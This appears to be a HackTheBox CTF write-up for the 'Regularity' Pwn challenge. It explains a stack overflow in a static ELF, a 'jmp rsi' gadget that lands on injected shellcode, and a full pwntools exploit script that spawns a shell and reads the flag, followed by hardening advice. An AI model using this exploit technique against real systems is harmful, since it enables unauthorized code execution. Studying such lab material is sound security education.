---
title: "Regularity"
date: 2026-12-02 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, shellcode, executable-stack, jmp-rsi, cwe-787]
description: "A Very Easy Pwn challenge: a hand-written static ELF reads past its stack buffer on an executable stack. With no leak and no jmp rsp gadget, the trick is that rsi still points at the buffer after read() — so a jmp rsi gadget lands straight on injected shellcode."
---

## Overview

`Regularity` is a Very Easy HackTheBox **Pwn** challenge. You get a tiny statically-linked x86-64 ELF that prints a line, reads some input, prints another line, and exits. There are no real libc functions — just hand-written `read`/`write`/`exit` syscall stubs. The read stub reads more bytes than the buffer holds, so you can overwrite the saved return address. Because the binary's stack is executable and there is neither an address leak nor a `jmp rsp` gadget, the whole solve hinges on one observation: the `read` syscall leaves your buffer's address sitting in `rsi`, and the program already contains a `jmp rsi`.

## The technique

`checksec` tells the story:

```
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x400000)
Stack:    Executable
```

The missing `GNU_STACK` program header makes the kernel apply `READ_IMPLIES_EXEC`, so the stack (and every readable segment) is executable. The vulnerable read stub is:

```nasm
read:
  sub  rsp, 0x100
  mov  eax, 0          ; SYS_read
  mov  edi, 0          ; fd 0
  lea  rsi, [rsp]      ; buf = rsp
  mov  edx, 0x110      ; count = 272
  syscall
  add  rsp, 0x100
  ret
```

The buffer is `0x100` (256) bytes but it reads `0x110` (272) — a 16-byte [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) that clobbers the saved return address at offset `0x100`.

Executable stack means shellcode-on-stack works, but with no leak you don't know the stack address, and this minimal binary has no `jmp rsp`/`jmp esp` gadget. The key: the read stub never reloads `rsi` after the syscall, so on return **`rsi` still points at the start of our buffer** — exactly where our shellcode sits. And `_start` ends with:

```nasm
movabs rsi, 0x40106f
jmp    rsi             ; <-- 0x401041, opcode ff e6
```

That `jmp rsi` at `0x401041` is a free "jump to the buffer I just filled". Overwrite the saved RIP with `0x401041` and execution lands on `shellcode[0]`. No infoleak required.

## Solution

The payload is just NOP-padded shellcode up to the saved-RIP offset, followed by the gadget address:

`shellcode.ljust(0x100, b'\x90') + p64(0x401041)`

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

JMP_RSI = 0x401041            # `jmp rsi` at end of _start; rsi == buffer
sc = asm(shellcraft.amd64.linux.sh())
payload = sc.ljust(0x100, b'\x90') + p64(JMP_RSI)   # 0x100 buf + saved RIP
assert len(payload) <= 0x110

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process('./regularity')

io.recv(timeout=2)            # "Hello, Survivor. Anything new these days?"
io.send(payload)
io.recvline(timeout=2)        # "Yup, same old same old here as well..."
io.sendline(b'cat flag.txt; id')
print(io.recvall(timeout=3).decode(errors='replace'))
```

Run it against the instance:

```bash
python3 solve.py REMOTE HOST=<target-ip> PORT=<target-port>
```

The shellcode spawns `/bin/sh` running as root, and `cat flag.txt` returns the flag (`HTB{...}`, redacted).

## Why it worked

The SysV calling convention puts `read(2)`'s `buf` argument in `rsi`. A hand-written stub never touches `rsi` again before returning, so the register still holds the address of the buffer it just filled with our shellcode. A `jmp rsi` gadget therefore becomes a direct "execute the buffer" primitive — a complete substitute for a stack leak or a `jmp rsp` gadget. Combine that with the executable stack (missing `GNU_STACK`) and the over-long `read`, and the [buffer overflow](https://cwe.mitre.org/data/definitions/120.html) becomes a clean shellcode-execution chain.

## Fix / defense

- Read exactly `sizeof(buf)` bytes, never `buf + slack` — the `0x110` read into a `0x100` buffer is the root bug.
- Mark the stack non-executable: emit a proper `GNU_STACK` header / build with `-z noexecstack` so injected shellcode can't run even if the overflow lands.
- Add a stack canary (`-fstack-protector-strong`) and build position-independent (`-pie`) so a saved-RIP overwrite is detected and the address space is randomized.
